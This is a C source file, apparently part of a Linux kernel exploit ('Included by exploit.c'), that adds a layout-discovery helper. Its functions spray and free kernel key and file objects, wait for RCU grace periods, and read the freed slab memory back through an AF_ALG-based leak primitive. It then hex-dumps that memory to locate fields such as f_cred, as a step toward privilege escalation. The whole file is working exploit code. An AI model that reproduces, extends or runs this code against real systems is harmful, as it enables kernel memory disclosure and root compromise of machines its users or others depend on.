/* Layout discovery helper for kernels without BTF: dump a captured slab page
   of the given object class as hex and exit.  Included by exploit.c.

   K2_DUMP=keys ./exploit     - retired struct key page, distinctive fields
   K2_DUMP=filp ./exploit     - retired struct file page (f_cred)
*/

#define K2_DUMP_BYTES 1016U
#define K2_DUMP_TARGETS (K2_DUMP_BYTES / 8U)

static void k2_dump_hex(const char *tag, const unsigned char *page,
                        size_t length)
{
    printf("K2_DUMP_BEGIN what=%s uid=%ld pid=%ld bytes=%zu\n", tag,
           (long)getuid(), (long)getpid(), length);
    for (size_t offset = 0; offset < length; offset += 32) {
        size_t chunk = length - offset < 32 ? length - offset : 32;

        printf("%04zx:", offset);
        for (size_t i = 0; i < chunk; i++)
            printf(" %02x", page[offset + i]);
        printf("\n");
    }
    printf("K2_DUMP_END\n");
}

static int k2_dump_keys(unsigned char *page)
{
    enum { DUMP_KEYS = 320 };
    key_serial_t *serials;
    int ring, rc;
    struct gap_plan plan;
    size_t targets[K2_DUMP_TARGETS];

    for (size_t i = 0; i < K2_DUMP_TARGETS; i++)
        targets[i] = i * 8;
    rc = build_target_plan(targets, K2_DUMP_TARGETS, 4096, &plan);
    if (rc)
        return rc;
    ring = create_keyring("dump", KEY_SPEC_PROCESS_KEYRING);
    if (ring < 0)
        return ring;
    serials = calloc(DUMP_KEYS, sizeof(*serials));
    if (!serials)
        return -ENOMEM;
    for (unsigned int i = 0; i < DUMP_KEYS; i++) {
        unsigned char payload = (unsigned char)i;
        char description[32];
        long serial;

        /* desc_len 6, known prefix, distinctive perm set below */
        snprintf(description, sizeof(description), "kd%05x", i);
        serial = add_key_raw("user", description, &payload, 1,
                             (key_serial_t)ring);
        if (serial < 0) {
            rc = -errno;
            free(serials);
            return rc;
        }
        serials[i] = (key_serial_t)serial;
        (void)keyctl_raw(KEYCTL_SETPERM, (unsigned long)serial,
                         UINT32_C(0x3f3f3f3f), 0, 0);
    }
    /* print the serials so the dump can be aligned */
    printf("K2_DUMP_SERIALS first=%d second=%d last=%d\n", serials[0],
           serials[1], serials[DUMP_KEYS - 1]);
    (void)keyctl_raw(KEYCTL_CLEAR, (unsigned long)ring, 0, 0, 0);
    for (unsigned int i = 0; i < DUMP_KEYS; i++)
        (void)keyctl_raw(KEYCTL_INVALIDATE, (unsigned long)serials[i], 0, 0, 0);
    free(serials);
    rc = global_rcu_gp();
    if (rc)
        return rc;
    usleep(60000);
    rc = global_rcu_gp();
    if (rc)
        return rc;
    for (unsigned int attempt = 0; attempt < 12; attempt++) {
        unsigned char *record = NULL;
        size_t length = 0;

        rc = afalg_plan_record(&plan, 1000, &record, &length);
        if (rc)
            return rc;
        if (length >= K2_DUMP_BYTES) {
            memcpy(page, record, K2_DUMP_BYTES);
            free(record);
            return 0;
        }
        free(record);
    }
    return -ENOENT;
}

static int k2_dump_filp(unsigned char *page)
{
    enum { DUMP_FILES = 600 };
    int *fds;
    int rc;
    struct gap_plan plan;
    size_t targets[K2_DUMP_TARGETS];

    for (size_t i = 0; i < K2_DUMP_TARGETS; i++)
        targets[i] = i * 8;
    rc = build_target_plan(targets, K2_DUMP_TARGETS, 4096, &plan);
    if (rc)
        return rc;
    fds = calloc(DUMP_FILES, sizeof(*fds));
    if (!fds)
        return -ENOMEM;
    for (unsigned int i = 0; i < DUMP_FILES; i++)
        fds[i] = open("/dev/null", O_RDONLY | O_CLOEXEC);
    for (unsigned int i = 0; i < DUMP_FILES; i++)
        if (fds[i] >= 0)
            close(fds[i]);
    free(fds);
    rc = global_rcu_gp();
    if (rc)
        return rc;
    usleep(40000);
    rc = global_rcu_gp();
    if (rc)
        return rc;
    for (unsigned int attempt = 0; attempt < 12; attempt++) {
        unsigned char *record = NULL;
        size_t length = 0;

        rc = afalg_plan_record(&plan, 1000, &record, &length);
        if (rc)
            return rc;
        if (length >= K2_DUMP_BYTES) {
            memcpy(page, record, K2_DUMP_BYTES);
            free(record);
            return 0;
        }
        free(record);
    }
    return -ENOENT;
}

__attribute__((constructor)) static void k2_dump_constructor(void)
{
    const char *what = getenv("K2_DUMP");
    unsigned char page[K2_DUMP_BYTES];
    int rc;

    if (!what || !*what)
        return;
    setvbuf(stdout, NULL, _IONBF, 0);
    memset(page, 0, sizeof(page));
    if (strcmp(what, "keys") == 0)
        rc = k2_dump_keys(page);
    else if (strcmp(what, "filp") == 0)
        rc = k2_dump_filp(page);
    else {
        fprintf(stderr, "K2_DUMP=keys|filp\n");
        _exit(2);
    }
    if (rc) {
        fprintf(stderr, "K2_DUMP_FAIL what=%s rc=%d\n", what, rc);
        _exit(1);
    }
    k2_dump_hex(what, page, sizeof(page));
    _exit(0);
}
